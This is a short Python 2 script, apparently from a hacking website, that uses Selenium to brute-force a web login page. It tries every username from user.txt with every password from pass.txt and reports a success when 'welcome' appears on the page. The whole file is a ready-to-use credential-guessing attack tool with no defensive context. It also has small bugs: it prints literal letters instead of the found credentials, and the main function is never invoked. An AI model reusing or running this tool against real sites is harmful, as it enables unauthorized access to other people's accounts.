#coding=utf-8
#author:Jumbo
#website:www.chinabaiker.com


import time
from selenium import webdriver

class Brute_pass(object):
    def __init__(self,url):
        self.url = url
        self.driver = webdriver.Chrome()

    def click(self,u,p):
        self.driver.get(self.url)
        self.driver.implicitly_wait(10)
        elem = self.driver.find_element_by_name('username')
        elem.send_keys(u)
        elem = self.driver.find_element_by_name('password')
        elem.send_keys(p)
        elem = self.driver.find_element_by_name('login_manager')
        elem.click()
        time.sleep(1)
        if 'welcome' in self.driver.page_source:
            print '###','u','p','###','Login Success'
        else:
            print 'LoginFaild'
    
def main(url):
    brute_pass = Brute_pass(url)
    # brute_pass.click()
    with open('pass.txt','r') as password_dict:
        for password in password_dict.readlines():
            p = password.strip()
            with open('user.txt','r') as username_dict:
                for username in username_dict.readlines():
                    u = username.strip()
                    print u,p
                    brute_pass.click(u,p)
